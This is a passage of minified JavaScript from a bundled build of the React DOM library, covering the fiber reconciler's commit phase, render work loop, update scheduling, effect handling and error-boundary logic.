kr(),!(e.flags&128)&&(e.memoizedState=null),e.flags|=4;Gt(e),r=!1}else Wn!==null&&(gd(Wn),Wn=null),r=!0;if(!r)return e.flags&65536?e:null}return e.flags&128?(e.lanes=n,e):(i=i!==null,i!==(t!==null&&t.memoizedState!==null)&&i&&(e.child.flags|=8192,e.mode&1&&(t===null||mt.current&1?kt===0&&(kt=3):ip())),e.updateQueue!==null&&(e.flags|=4),Gt(e),null);case 4:return Pr(),ld(t,e),t===null&&Na(e.stateNode.containerInfo),Gt(e),null;case 10:return zh(e.type._context),Gt(e),null;case 17:return dn(e.type)&&wl(),Gt(e),null;case 19:if(pt(mt),r=e.memoizedState,r===null)return Gt(e),null;if(i=(e.flags&128)!==0,a=r.rendering,a===null)if(i)Qr(r,!1);else{if(kt!==0||t!==null&&t.flags&128)for(t=e.child;t!==null;){if(a=kl(t),a!==null){for(e.flags|=128,Qr(r,!1),i=a.updateQueue,i!==null&&(e.updateQueue=i,e.flags|=4),e.subtreeFlags=0,i=n,n=e.child;n!==null;)r=n,t=i,r.flags&=14680066,a=r.alternate,a===null?(r.childLanes=0,r.lanes=t,r.child=null,r.subtreeFlags=0,r.memoizedProps=null,r.memoizedState=null,r.updateQueue=null,r.dependencies=null,r.stateNode=null):(r.childLanes=a.childLanes,r.lanes=a.lanes,r.child=a.child,r.subtreeFlags=0,r.deletions=null,r.memoizedProps=a.memoizedProps,r.memoizedState=a.memoizedState,r.updateQueue=a.updateQueue,r.type=a.type,t=a.dependencies,r.dependencies=t===null?null:{lanes:t.lanes,firstContext:t.firstContext}),n=n.sibling;return dt(mt,mt.current&1|2),e.child}t=t.sibling}r.tail!==null&&wt()>Ir&&(e.flags|=128,i=!0,Qr(r,!1),e.lanes=4194304)}else{if(!i)if(t=kl(a),t!==null){if(e.flags|=128,i=!0,n=t.updateQueue,n!==null&&(e.updateQueue=n,e.flags|=4),Qr(r,!0),r.tail===null&&r.tailMode==="hidden"&&!a.alternate&&!ft)return Gt(e),null}else 2*wt()-r.renderingStartTime>Ir&&n!==1073741824&&(e.flags|=128,i=!0,Qr(r,!1),e.lanes=4194304);r.isBackwards?(a.sibling=e.child,e.child=a):(n=r.last,n!==null?n.sibling=a:e.child=a,r.last=a)}return r.tail!==null?(e=r.tail,r.rendering=e,r.tail=e.sibling,r.renderingStartTime=wt(),e.sibling=null,n=mt.current,dt(mt,i?n&1|2:n&1),e):(Gt(e),null);case 22:case 23:return np(),i=e.memoizedState!==null,t!==null&&t.memoizedState!==null!==i&&(e.flags|=8192),i&&e.mode&1?yn&1073741824&&(Gt(e),e.subtreeFlags&6&&(e.flags|=8192)):Gt(e),null;case 24:return null;case 25:return null}throw Error(se(156,e.tag))}function U_(t,e){switch(Uh(e),e.tag){case 1:return dn(e.type)&&wl(),t=e.flags,t&65536?(e.flags=t&-65537|128,e):null;case 3:return Pr(),pt(un),pt(Kt),jh(),t=e.flags,t&65536&&!(t&128)?(e.flags=t&-65537|128,e):null;case 5:return Wh(e),null;case 13:if(pt(mt),t=e.memoizedState,t!==null&&t.dehydrated!==null){if(e.alternate===null)throw Error(se(340));kr()}return t=e.flags,t&65536?(e.flags=t&-65537|128,e):null;case 19:return pt(mt),null;case 4:return Pr(),null;case 10:return zh(e.type._context),null;case 22:case 23:return np(),null;case 24:return null;default:return null}}var Eo=!1,Xt=!1,O_=typeof WeakSet=="function"?WeakSet:Set,xe=null;function vr(t,e){var n=t.ref;if(n!==null)if(typeof n=="function")try{n(null)}catch(i){_t(t,e,i)}else n.current=null}function cd(t,e,n){try{n()}catch(i){_t(t,e,i)}}var Df=!1;function F_(t,e){if(Xu=xl,t=ov(),Ih(t)){if("selectionStart"in t)var n={start:t.selectionStart,end:t.selectionEnd};else e:{n=(n=t.ownerDocument)&&n.defaultView||window;var i=n.getSelection&&n.getSelection();if(i&&i.rangeCount!==0){n=i.anchorNode;var s=i.anchorOffset,r=i.focusNode;i=i.focusOffset;try{n.nodeType,r.nodeType}catch{n=null;break e}var a=0,o=-1,l=-1,c=0,h=0,d=t,p=null;t:for(;;){for(var f;d!==n||s!==0&&d.nodeType!==3||(o=a+s),d!==r||i!==0&&d.nodeType!==3||(l=a+i),d.nodeType===3&&(a+=d.nodeValue.length),(f=d.firstChild)!==null;)p=d,d=f;for(;;){if(d===t)break t;if(p===n&&++c===s&&(o=a),p===r&&++h===i&&(l=a),(f=d.nextSibling)!==null)break;d=p,p=d.parentNode}d=f}n=o===-1||l===-1?null:{start:o,end:l}}else n=null}n=n||{start:0,end:0}}else n=null;for(qu={focusedElem:t,selectionRange:n},xl=!1,xe=e;xe!==null;)if(e=xe,t=e.child,(e.subtreeFlags&1028)!==0&&t!==null)t.return=e,xe=t;else for(;xe!==null;){e=xe;try{var y=e.alternate;if(e.flags&1024)switch(e.tag){case 0:case 11:case 15:break;case 1:if(y!==null){var _=y.memoizedProps,g=y.memoizedState,u=e.stateNode,v=u.getSnapshotBeforeUpdate(e.elementType===e.type?_:Vn(e.type,_),g);u.__reactInternalSnapshotBeforeUpdate=v}break;case 3:var x=e.stateNode.containerInfo;x.nodeType===1?x.textContent="":x.nodeType===9&&x.documentElement&&x.removeChild(x.documentElement);break;case 5:case 6:case 4:case 17:break;default:throw Error(se(163))}}catch(S){_t(e,e.return,S)}if(t=e.sibling,t!==null){t.return=e.return,xe=t;break}xe=e.return}return y=Df,Df=!1,y}function Sa(t,e,n){var i=e.updateQueue;if(i=i!==null?i.lastEffect:null,i!==null){var s=i=i.next;do{if((s.tag&t)===t){var r=s.destroy;s.destroy=void 0,r!==void 0&&cd(e,n,r)}s=s.next}while(s!==i)}}function Jl(t,e){if(e=e.updateQueue,e=e!==null?e.lastEffect:null,e!==null){var n=e=e.next;do{if((n.tag&t)===t){var i=n.create;n.destroy=i()}n=n.next}while(n!==e)}}function ud(t){var e=t.ref;if(e!==null){var n=t.stateNode;switch(t.tag){case 5:t=n;break;default:t=n}typeof e=="function"?e(t):e.current=t}}function i0(t){var e=t.alternate;e!==null&&(t.alternate=null,i0(e)),t.child=null,t.deletions=null,t.sibling=null,t.tag===5&&(e=t.stateNode,e!==null&&(delete e[ii],delete e[Da],delete e[Ku],delete e[__],delete e[b_])),t.stateNode=null,t.return=null,t.dependencies=null,t.memoizedProps=null,t.memoizedState=null,t.pendingProps=null,t.stateNode=null,t.updateQueue=null}function s0(t){return t.tag===5||t.tag===3||t.tag===4}function Uf(t){e:for(;;){for(;t.sibling===null;){if(t.return===null||s0(t.return))return null;t=t.return}for(t.sibling.return=t.return,t=t.sibling;t.tag!==5&&t.tag!==6&&t.tag!==18;){if(t.flags&2||t.child===null||t.tag===4)continue e;t.child.return=t,t=t.child}if(!(t.flags&2))return t.stateNode}}function dd(t,e,n){var i=t.tag;if(i===5||i===6)t=t.stateNode,e?n.nodeType===8?n.parentNode.insertBefore(t,e):n.insertBefore(t,e):(n.nodeType===8?(e=n.parentNode,e.insertBefore(t,n)):(e=n,e.appendChild(t)),n=n._reactRootContainer,n!=null||e.onclick!==null||(e.onclick=Sl));else if(i!==4&&(t=t.child,t!==null))for(dd(t,e,n),t=t.sibling;t!==null;)dd(t,e,n),t=t.sibling}function hd(t,e,n){var i=t.tag;if(i===5||i===6)t=t.stateNode,e?n.insertBefore(t,e):n.appendChild(t);else if(i!==4&&(t=t.child,t!==null))for(hd(t,e,n),t=t.sibling;t!==null;)hd(t,e,n),t=t.sibling}var Ot=null,Hn=!1;function Oi(t,e,n){for(n=n.child;n!==null;)r0(t,e,n),n=n.sibling}function r0(t,e,n){if(ai&&typeof ai.onCommitFiberUnmount=="function")try{ai.onCommitFiberUnmount(Wl,n)}catch{}switch(n.tag){case 5:Xt||vr(n,e);case 6:var i=Ot,s=Hn;Ot=null,Oi(t,e,n),Ot=i,Hn=s,Ot!==null&&(Hn?(t=Ot,n=n.stateNode,t.nodeType===8?t.parentNode.removeChild(n):t.removeChild(n)):Ot.removeChild(n.stateNode));break;case 18:Ot!==null&&(Hn?(t=Ot,n=n.stateNode,t.nodeType===8?Rc(t.parentNode,n):t.nodeType===1&&Rc(t,n),ka(t)):Rc(Ot,n.stateNode));break;case 4:i=Ot,s=Hn,Ot=n.stateNode.containerInfo,Hn=!0,Oi(t,e,n),Ot=i,Hn=s;break;case 0:case 11:case 14:case 15:if(!Xt&&(i=n.updateQueue,i!==null&&(i=i.lastEffect,i!==null))){s=i=i.next;do{var r=s,a=r.destroy;r=r.tag,a!==void 0&&(r&2||r&4)&&cd(n,e,a),s=s.next}while(s!==i)}Oi(t,e,n);break;case 1:if(!Xt&&(vr(n,e),i=n.stateNode,typeof i.componentWillUnmount=="function"))try{i.props=n.memoizedProps,i.state=n.memoizedState,i.componentWillUnmount()}catch(o){_t(n,e,o)}Oi(t,e,n);break;case 21:Oi(t,e,n);break;case 22:n.mode&1?(Xt=(i=Xt)||n.memoizedState!==null,Oi(t,e,n),Xt=i):Oi(t,e,n);break;default:Oi(t,e,n)}}function Of(t){var e=t.updateQueue;if(e!==null){t.updateQueue=null;var n=t.stateNode;n===null&&(n=t.stateNode=new O_),e.forEach(function(i){var s=q_.bind(null,t,i);n.has(i)||(n.add(i),i.then(s,s))})}}function On(t,e){var n=e.deletions;if(n!==null)for(var i=0;i<n.length;i++){var s=n[i];try{var r=t,a=e,o=a;e:for(;o!==null;){switch(o.tag){case 5:Ot=o.stateNode,Hn=!1;break e;case 3:Ot=o.stateNode.containerInfo,Hn=!0;break e;case 4:Ot=o.stateNode.containerInfo,Hn=!0;break e}o=o.return}if(Ot===null)throw Error(se(160));r0(r,a,s),Ot=null,Hn=!1;var l=s.alternate;l!==null&&(l.return=null),s.return=null}catch(c){_t(s,e,c)}}if(e.subtreeFlags&12854)for(e=e.child;e!==null;)a0(e,t),e=e.sibling}function a0(t,e){var n=t.alternate,i=t.flags;switch(t.tag){case 0:case 11:case 14:case 15:if(On(e,t),Qn(t),i&4){try{Sa(3,t,t.return),Jl(3,t)}catch(_){_t(t,t.return,_)}try{Sa(5,t,t.return)}catch(_){_t(t,t.return,_)}}break;case 1:On(e,t),Qn(t),i&512&&n!==null&&vr(n,n.return);break;case 5:if(On(e,t),Qn(t),i&512&&n!==null&&vr(n,n.return),t.flags&32){var s=t.stateNode;try{Ta(s,"")}catch(_){_t(t,t.return,_)}}if(i&4&&(s=t.stateNode,s!=null)){var r=t.memoizedProps,a=n!==null?n.memoizedProps:r,o=t.type,l=t.updateQueue;if(t.updateQueue=null,l!==null)try{o==="input"&&r.type==="radio"&&r.name!=null&&Cg(s,r),Uu(o,a);var c=Uu(o,r);for(a=0;a<l.length;a+=2){var h=l[a],d=l[a+1];h==="style"?Ng(s,d):h==="dangerouslySetInnerHTML"?Lg(s,d):h==="children"?Ta(s,d):bh(s,h,d,c)}switch(o){case"input":Lu(s,r);break;case"textarea":Rg(s,r);break;case"select":var p=s._wrapperState.wasMultiple;s._wrapperState.wasMultiple=!!r.multiple;var f=r.value;f!=null?_r(s,!!r.multiple,f,!1):p!==!!r.multiple&&(r.defaultValue!=null?_r(s,!!r.multiple,r.defaultValue,!0):_r(s,!!r.multiple,r.multiple?[]:"",!1))}s[Da]=r}catch(_){_t(t,t.return,_)}}break;case 6:if(On(e,t),Qn(t),i&4){if(t.stateNode===null)throw Error(se(162));s=t.stateNode,r=t.memoizedProps;try{s.nodeValue=r}catch(_){_t(t,t.return,_)}}break;case 3:if(On(e,t),Qn(t),i&4&&n!==null&&n.memoizedState.isDehydrated)try{ka(e.containerInfo)}catch(_){_t(t,t.return,_)}break;case 4:On(e,t),Qn(t);break;case 13:On(e,t),Qn(t),s=t.child,s.flags&8192&&(r=s.memoizedState!==null,s.stateNode.isHidden=r,!r||s.alternate!==null&&s.alternate.memoizedState!==null||(ep=wt())),i&4&&Of(t);break;case 22:if(h=n!==null&&n.memoizedState!==null,t.mode&1?(Xt=(c=Xt)||h,On(e,t),Xt=c):On(e,t),Qn(t),i&8192){if(c=t.memoizedState!==null,(t.stateNode.isHidden=c)&&!h&&t.mode&1)for(xe=t,h=t.child;h!==null;){for(d=xe=h;xe!==null;){switch(p=xe,f=p.child,p.tag){case 0:case 11:case 14:case 15:Sa(4,p,p.return);break;case 1:vr(p,p.return);var y=p.stateNode;if(typeof y.componentWillUnmount=="function"){i=p,n=p.return;try{e=i,y.props=e.memoizedProps,y.state=e.memoizedState,y.componentWillUnmount()}catch(_){_t(i,n,_)}}break;case 5:vr(p,p.return);break;case 22:if(p.memoizedState!==null){Bf(d);continue}}f!==null?(f.return=p,xe=f):Bf(d)}h=h.sibling}e:for(h=null,d=t;;){if(d.tag===5){if(h===null){h=d;try{s=d.stateNode,c?(r=s.style,typeof r.setProperty=="function"?r.setProperty("display","none","important"):r.display="none"):(o=d.stateNode,l=d.memoizedProps.style,a=l!=null&&l.hasOwnProperty("display")?l.display:null,o.style.display=Pg("display",a))}catch(_){_t(t,t.return,_)}}}else if(d.tag===6){if(h===null)try{d.stateNode.nodeValue=c?"":d.memoizedProps}catch(_){_t(t,t.return,_)}}else if((d.tag!==22&&d.tag!==23||d.memoizedState===null||d===t)&&d.child!==null){d.child.return=d,d=d.child;continue}if(d===t)break e;for(;d.sibling===null;){if(d.return===null||d.return===t)break e;h===d&&(h=null),d=d.return}h===d&&(h=null),d.sibling.return=d.return,d=d.sibling}}break;case 19:On(e,t),Qn(t),i&4&&Of(t);break;case 21:break;default:On(e,t),Qn(t)}}function Qn(t){var e=t.flags;if(e&2){try{e:{for(var n=t.return;n!==null;){if(s0(n)){var i=n;break e}n=n.return}throw Error(se(160))}switch(i.tag){case 5:var s=i.stateNode;i.flags&32&&(Ta(s,""),i.flags&=-33);var r=Uf(t);hd(t,r,s);break;case 3:case 4:var a=i.stateNode.containerInfo,o=Uf(t);dd(t,o,a);break;default:throw Error(se(161))}}catch(l){_t(t,t.return,l)}t.flags&=-3}e&4096&&(t.flags&=-4097)}function B_(t,e,n){xe=t,o0(t)}function o0(t,e,n){for(var i=(t.mode&1)!==0;xe!==null;){var s=xe,r=s.child;if(s.tag===22&&i){var a=s.memoizedState!==null||Eo;if(!a){var o=s.alternate,l=o!==null&&o.memoizedState!==null||Xt;o=Eo;var c=Xt;if(Eo=a,(Xt=l)&&!c)for(xe=s;xe!==null;)a=xe,l=a.child,a.tag===22&&a.memoizedState!==null?zf(s):l!==null?(l.return=a,xe=l):zf(s);for(;r!==null;)xe=r,o0(r),r=r.sibling;xe=s,Eo=o,Xt=c}Ff(t)}else s.subtreeFlags&8772&&r!==null?(r.return=s,xe=r):Ff(t)}}function Ff(t){for(;xe!==null;){var e=xe;if(e.flags&8772){var n=e.alternate;try{if(e.flags&8772)switch(e.tag){case 0:case 11:case 15:Xt||Jl(5,e);break;case 1:var i=e.stateNode;if(e.flags&4&&!Xt)if(n===null)i.componentDidMount();else{var s=e.elementType===e.type?n.memoizedProps:Vn(e.type,n.memoizedProps);i.componentDidUpdate(s,n.memoizedState,i.__reactInternalSnapshotBeforeUpdate)}var r=e.updateQueue;r!==null&&Sf(e,r,i);break;case 3:var a=e.updateQueue;if(a!==null){if(n=null,e.child!==null)switch(e.child.tag){case 5:n=e.child.stateNode;break;case 1:n=e.child.stateNode}Sf(e,a,n)}break;case 5:var o=e.stateNode;if(n===null&&e.flags&4){n=o;var l=e.memoizedProps;switch(e.type){case"button":case"input":case"select":case"textarea":l.autoFocus&&n.focus();break;case"img":l.src&&(n.src=l.src)}}break;case 6:break;case 4:break;case 12:break;case 13:if(e.memoizedState===null){var c=e.alternate;if(c!==null){var h=c.memoizedState;if(h!==null){var d=h.dehydrated;d!==null&&ka(d)}}}break;case 19:case 17:case 21:case 22:case 23:case 25:break;default:throw Error(se(163))}Xt||e.flags&512&&ud(e)}catch(p){_t(e,e.return,p)}}if(e===t){xe=null;break}if(n=e.sibling,n!==null){n.return=e.return,xe=n;break}xe=e.return}}function Bf(t){for(;xe!==null;){var e=xe;if(e===t){xe=null;break}var n=e.sibling;if(n!==null){n.return=e.return,xe=n;break}xe=e.return}}function zf(t){for(;xe!==null;){var e=xe;try{switch(e.tag){case 0:case 11:case 15:var n=e.return;try{Jl(4,e)}catch(l){_t(e,n,l)}break;case 1:var i=e.stateNode;if(typeof i.componentDidMount=="function"){var s=e.return;try{i.componentDidMount()}catch(l){_t(e,s,l)}}var r=e.return;try{ud(e)}catch(l){_t(e,r,l)}break;case 5:var a=e.return;try{ud(e)}catch(l){_t(e,a,l)}}}catch(l){_t(e,e.return,l)}if(e===t){xe=null;break}var o=e.sibling;if(o!==null){o.return=e.return,xe=o;break}xe=e.return}}var z_=Math.ceil,Nl=Ui.ReactCurrentDispatcher,Jh=Ui.ReactCurrentOwner,Nn=Ui.ReactCurrentBatchConfig,qe=0,Ut=null,At=null,zt=0,yn=0,yr=ps(0),kt=0,Va=null,Bs=0,Ql=0,Qh=0,wa=null,ln=null,ep=0,Ir=1/0,_i=null,Il=!1,pd=null,rs=null,To=!1,Zi=null,Dl=0,Ma=0,fd=null,rl=-1,al=0;function en(){return qe&6?wt():rl!==-1?rl:rl=wt()}function as(t){return t.mode&1?qe&2&&zt!==0?zt&-zt:w_.transition!==null?(al===0&&(al=jg()),al):(t=st,t!==0||(t=window.event,t=t===void 0?16:Jg(t.type)),t):1}function $n(t,e,n,i){if(50<Ma)throw Ma=0,fd=null,Error(se(185));Za(t,n,i),(!(qe&2)||t!==Ut)&&(t===Ut&&(!(qe&2)&&(Ql|=n),kt===4&&Yi(t,zt)),hn(t,i),n===1&&qe===0&&!(e.mode&1)&&(Ir=wt()+500,$l&&fs()))}function hn(t,e){var n=t.callbackNode;wx(t,e);var i=yl(t,t===Ut?zt:0);if(i===0)n!==null&&Yp(n),t.callbackNode=null,t.callbackPriority=0;else if(e=i&-i,t.callbackPriority!==e){if(n!=null&&Yp(n),e===1)t.tag===0?S_(Vf.bind(null,t)):vv(Vf.bind(null,t)),y_(function(){!(qe&6)&&fs()}),n=null;else{switch(Xg(i)){case 1:n=Th;break;case 4:n=Gg;break;case 16:n=vl;break;case 536870912:n=Wg;break;default:n=vl}n=m0(n,l0.bind(null,t))}t.callbackPriority=e,t.callbackNode=n}}function l0(t,e){if(rl=-1,al=0,qe&6)throw Error(se(327));var n=t.callbackNode;if(Er()&&t.callbackNode!==n)return null;var i=yl(t,t===Ut?zt:0);if(i===0)return null;if(i&30||i&t.expiredLanes||e)e=Ul(t,i);else{e=i;var s=qe;qe|=2;var r=u0();(Ut!==t||zt!==e)&&(_i=null,Ir=wt()+500,Is(t,e));do try{G_();break}catch(o){c0(t,o)}while(!0);Bh(),Nl.current=r,qe=s,At!==null?e=0:(Ut=null,zt=0,e=kt)}if(e!==0){if(e===2&&(s=Vu(t),s!==0&&(i=s,e=md(t,s))),e===1)throw n=Va,Is(t,0),Yi(t,i),hn(t,wt()),n;if(e===6)Yi(t,i);else{if(s=t.current.alternate,!(i&30)&&!V_(s)&&(e=Ul(t,i),e===2&&(r=Vu(t),r!==0&&(i=r,e=md(t,r))),e===1))throw n=Va,Is(t,0),Yi(t,i),hn(t,wt()),n;switch(t.finishedWork=s,t.finishedLanes=i,e){case 0:case 1:throw Error(se(345));case 2:Es(t,ln,_i);break;case 3:if(Yi(t,i),(i&130023424)===i&&(e=ep+500-wt(),10<e)){if(yl(t,0)!==0)break;if(s=t.suspendedLanes,(s&i)!==i){en(),t.pingedLanes|=t.suspendedLanes&s;break}t.timeoutHandle=$u(Es.bind(null,t,ln,_i),e);break}Es(t,ln,_i);break;case 4:if(Yi(t,i),(i&4194240)===i)break;for(e=t.eventTimes,s=-1;0<i;){var a=31-Yn(i);r=1<<a,a=e[a],a>s&&(s=a),i&=~r}if(i=s,i=wt()-i,i=(120>i?120:480>i?480:1080>i?1080:1920>i?1920:3e3>i?3e3:4320>i?4320:1960*z_(i/1960))-i,10<i){t.timeoutHandle=$u(Es.bind(null,t,ln,_i),i);break}Es(t,ln,_i);break;case 5:Es(t,ln,_i);break;default:throw Error(se(329))}}}return hn(t,wt()),t.callbackNode===n?l0.bind(null,t):null}function md(t,e){var n=wa;return t.current.memoizedState.isDehydrated&&(Is(t,e).flags|=256),t=Ul(t,e),t!==2&&(e=ln,ln=n,e!==null&&gd(e)),t}function gd(t){ln===null?ln=t:ln.push.apply(ln,t)}function V_(t){for(var e=t;;){if(e.flags&16384){var n=e.updateQueue;if(n!==null&&(n=n.stores,n!==null))for(var i=0;i<n.length;i++){var s=n[i],r=s.getSnapshot;s=s.value;try{if(!Kn(r(),s))return!1}catch{return!1}}}if(n=e.child,e.subtreeFlags&16384&&n!==null)n.return=e,e=n;else{if(e===t)break;for(;e.sibling===null;){if(e.return===null||e.return===t)return!0;e=e.return}e.sibling.return=e.return,e=e.sibling}}return!0}function Yi(t,e){for(e&=~Qh,e&=~Ql,t.suspendedLanes|=e,t.pingedLanes&=~e,t=t.expirationTimes;0<e;){var n=31-Yn(e),i=1<<n;t[n]=-1,e&=~i}}function Vf(t){if(qe&6)throw Error(se(327));Er();var e=yl(t,0);if(!(e&1))return hn(t,wt()),null;var n=Ul(t,e);if(t.tag!==0&&n===2){var i=Vu(t);i!==0&&(e=i,n=md(t,i))}if(n===1)throw n=Va,Is(t,0),Yi(t,e),hn(t,wt()),n;if(n===6)throw Error(se(345));return t.finishedWork=t.current.alternate,t.finishedLanes=e,Es(t,ln,_i),hn(t,wt()),null}function tp(t,e){var n=qe;qe|=1;try{return t(e)}finally{qe=n,qe===0&&(Ir=wt()+500,$l&&fs())}}function zs(t){Zi!==null&&Zi.tag===0&&!(qe&6)&&Er();var e=qe;qe|=1;var n=Nn.transition,i=st;try{if(Nn.transition=null,st=1,t)return t()}finally{st=i,Nn.transition=n,qe=e,!(qe&6)&&fs()}}function np(){yn=yr.current,pt(yr)}function Is(t,e){t.finishedWork=null,t.finishedLanes=0;var n=t.timeoutHandle;if(n!==-1&&(t.timeoutHandle=-1,v_(n)),At!==null)for(n=At.return;n!==null;){var i=n;switch(Uh(i),i.tag){case 1:i=i.type.childContextTypes,i!=null&&wl();break;case 3:Pr(),pt(un),pt(Kt),jh();break;case 5:Wh(i);break;case 4:Pr();break;case 13:pt(mt);break;case 19:pt(mt);break;case 10:zh(i.type._context);break;case 22:case 23:np()}n=n.return}if(Ut=t,At=t=os(t.current,null),zt=yn=e,kt=0,Va=null,Qh=Ql=Bs=0,ln=wa=null,ks!==null){for(e=0;e<ks.length;e++)if(n=ks[e],i=n.interleaved,i!==null){n.interleaved=null;var s=i.next,r=n.pending;if(r!==null){var a=r.next;r.next=s,i.next=a}n.pending=i}ks=null}return t}function c0(t,e){do{var n=At;try{if(Bh(),nl.current=Pl,Ll){for(var i=gt.memoizedState;i!==null;){var s=i.queue;s!==null&&(s.pending=null),i=i.next}Ll=!1}if(Fs=0,Dt=Rt=gt=null,ba=!1,Fa=0,Jh.current=null,n===null||n.return===null){kt=1,Va=e,At=null;break}e:{var r=t,a=n.return,o=n,l=e;if(e=zt,o.flags|=32768,l!==null&&typeof l=="object"&&typeof l.then=="function"){var c=l,h=o,d=h.tag;if(!(h.mode&1)&&(d===0||d===11||d===15)){var p=h.alternate;p?(h.updateQueue=p.updateQueue,h.memoizedState=p.memoizedState,h.lanes=p.lanes):(h.updateQueue=null,h.memoizedState=null)}var f=Cf(a);if(f!==null){f.flags&=-257,Rf(f,a,o,r,e),f.mode&1&&Af(r,c,e),e=f,l=c;var y=e.updateQueue;if(y===null){var _=new Set;_.add(l),e.updateQueue=_}else y.add(l);break e}else{if(!(e&1)){Af(r,c,e),ip();break e}l=Error(se(426))}}else if(ft&&o.mode&1){var g=Cf(a);if(g!==null){!(g.flags&65536)&&(g.flags|=256),Rf(g,a,o,r,e),Oh(Nr(l,o));break e}}r=l=Nr(l,o),kt!==4&&(kt=2),wa===null?wa=[r]:wa.push(r),r=a;do{switch(r.tag){case 3:r.flags|=65536,e&=-e,r.lanes|=e;var u=Xv(r,l,e);bf(r,u);break e;case 1:o=l;var v=r.type,x=r.stateNode;if(!(r.flags&128)&&(typeof v.getDerivedStateFromError=="function"||x!==null&&typeof x.componentDidCatch=="function"&&(rs===null||!rs.has(x)))){r.flags|=65536,e&=-e,r.lanes|=e;var S=qv(r,o,e);bf(r,S);break e}}r=r.return}while(r!==null)}h0(n)}catch(E){e=E,At===n&&n!==null&&(At=n=n.return);continue}break}while(!0)}function u0(){var t=Nl.current;return Nl.current=Pl,t===null?Pl:t}function ip(){(kt===0||kt===3||kt===2)&&(kt=4),Ut===null||!(Bs&268435455)&&!(Ql&268435455)||Yi(Ut,zt)}function Ul(t,e){var n=qe;qe|=2;var i=u0();(Ut!==t||zt!==e)&&(_i=null,Is(t,e));do try{H_();break}catch(s){c0(t,s)}while(!0);if(Bh(),qe=n,Nl.current=i,At!==null)throw Error(se(261));return Ut=null,zt=0,kt}function H_(){for(;At!==null;)d0(At)}function G_(){for(;At!==null&&!fx();)d0(At)}function d0(t){var e=f0(t.alternate,t,yn);t.memoizedProps=t.pendingProps,e===null?h0(t):At=e,Jh.current=null}function h0(t){var e=t;do{var n=e.alternate;if(t=e.return,e.flags&32768){if(n=U_(n,e),n!==null){n.flags&=32767,At=n;return}if(t!==null)t.flags|=32768,t.subtreeFlags=0,t.deletions=null;else{kt=6,At=null;return}}else if(n=D_(n,e,yn),n!==null){At=n;return}if(e=e.sibling,e!==null){At=e;return}At=e=t}while(e!==null);kt===0&&(kt=5)}function Es(t,e,n){var i=st,s=Nn.transition;try{Nn.transition=null,st=1,W_(t,e,n,i)}finally{Nn.transition=s,st=i}return null}function W_(t,e,n,i){do Er();while(Zi!==null);if(qe&6)throw Error(se(327));n=t.finishedWork;var s=t.finishedLanes;if(n===null)return null;if(t.finishedWork=null,t.finishedLanes=0,n===t.current)throw Error(se(177));t.callbackNode=null,t.callbackPriority=0;var r=n.lanes|n.childLanes;if(Mx(t,r),t===Ut&&(At=Ut=null,zt=0),!(n.subtreeFlags&2064)&&!(n.flags&2064)||To||(To=!0,m0(vl,function(){return Er(),null})),r=(n.flags&15990)!==0,n.subtreeFlags&15990||r){r=Nn.transition,Nn.transition=null;var a=st;st=1;var o=qe;qe|=4,Jh.current=null,F_(t,n),a0(n,t),u_(qu),xl=!!Xu,qu=Xu=null,t.current=n,B_(n),mx(),qe=o,st=a,Nn.transition=r}else t.current=n;if(To&&(To=!1,Zi=t,Dl=s),r=t.pendingLanes,r===0&&(rs=null),yx(n.stateNode),hn(t,wt()),e!==null)for(i=t.onRecoverableError,n=0;n<e.length;n++)s=e[n],i(s.value,{componentStack:s.stack,digest:s.digest});if(Il)throw Il=!1,t=pd,pd=null,t;return Dl&1&&t.tag!==0&&Er(),r=t.pendingLanes,r&1?t===fd?Ma++:(Ma=0,fd=t):Ma=0,fs(),null}function Er(){if(Zi!==null){var t=Xg(Dl),e=Nn.transition,n=st;try{if(Nn.transition=null,st=16>t?16:t,Zi===null)var i=!1;else{if(t=Zi,Zi=null,Dl=0,qe&6)throw Error(se(331));var s=qe;for(qe|=4,xe=t.current;xe!==null;){var r=xe,a=r.child;if(xe.flags&16){var o=r.deletions;if(o!==null){for(var l=0;l<o.length;l++){var c=o[l];for(xe=c;xe!==null;){var h=xe;switch(h.tag){case 0:case 11:case 15:Sa(8,h,r)}var d=h.child;if(d!==null)d.return=h,xe=d;else for(;xe!==null;){h=xe;var p=h.sibling,f=h.return;if(i0(h),h===c){xe=null;break}if(p!==null){p.return=f,xe=p;break}xe=f}}}var y=r.alternate;if(y!==null){var _=y.child;if(_!==null){y.child=null;do{var g=_.sibling;_.sibling=null,_=g}while(_!==null)}}xe=r}}if(r.subtreeFlags&2064&&a!==null)a.return=r,xe=a;else e:for(;xe!==null;){if(r=xe,r.flags&2048)switch(r.tag){case 0:case 11:case 15:Sa(9,r,r.return)}var u=r.sibling;if(u!==null){u.return=r.return,xe=u;break e}xe=r.return}}var v=t.current;for(xe=v;xe!==null;){a=xe;var x=a.child;if(a.subtreeFlags&2064&&x!==null)x.return=a,xe=x;else e:for(a=v;xe!==null;){if(o=xe,o.flags&2048)try{switch(o.tag){case 0:case 11:case 15:Jl(9,o)}}catch(E){_t(o,o.return,E)}if(o===a){xe=null;break e}var S=o.sibling;if(S!==null){S.return=o.return,xe=S;break e}xe=o.return}}if(qe=s,fs(),ai&&typeof ai.onPostCommitFiberRoot=="function")try{ai.onPostCommitFiberRoot(Wl,t)}catch{}i=!0}return i}finally{st=n,Nn.transition=e}}return!1}function Hf(t,e,n){e=Nr(n,e),e=Xv(t,e,1),t=ss(t,e,1),e=en(),t!==null&&(Za(t,1,e),hn(t,e))}function _t(t,e,n){if(t.tag===3)Hf(t,t,n);else for(;e!==null;){if(e.tag===3){Hf(e,t,n);break}else if(e.tag===1){var i=e.stateNode;if(typeof e.type.getDerivedStateFromError=="function"||typeof i.componentDidCatch=="function"&&(rs===null||!rs.has(i))){t=Nr(n,t),t=qv(e,t,1),e=ss(e,t,1),t=en(),e!==null&&(Za(e,1,t),hn(e,t));break}}e=e.return}}function j_(t,e,n){var i=t.pingCache;i!==null&&i.delete(e),e=en(),t.pingedLanes|=t.suspendedLanes&n,Ut===t&&(zt&n)===n&&(kt===4||kt===3&&(zt&130023424)===zt&&500>wt()-ep?Is(t,0):Qh|=n),hn(t,e)}function p0(t,e){e===0&&(t.mode&1?(e=go,go<<=1,!(go&130023424)&&(go=4194304)):e=1);var n=en();t=Pi(t,e),t!==null&&(Za(t,e,n),hn(t,n))}function X_(t){var e=t.memoizedState,n=0;e!==null&&(n=e.retryLane),p0(t,n)}function q_(t,e){var n=0;switch(t.tag){case 13:var i=t.stateNode,s=t.memoizedState;s!==null&&(n=s.retryLane);break;case 19:i=t.stateNode;break;default:throw Error(se(314))}i!==null&&i.delete(e),p0(t,n)}var 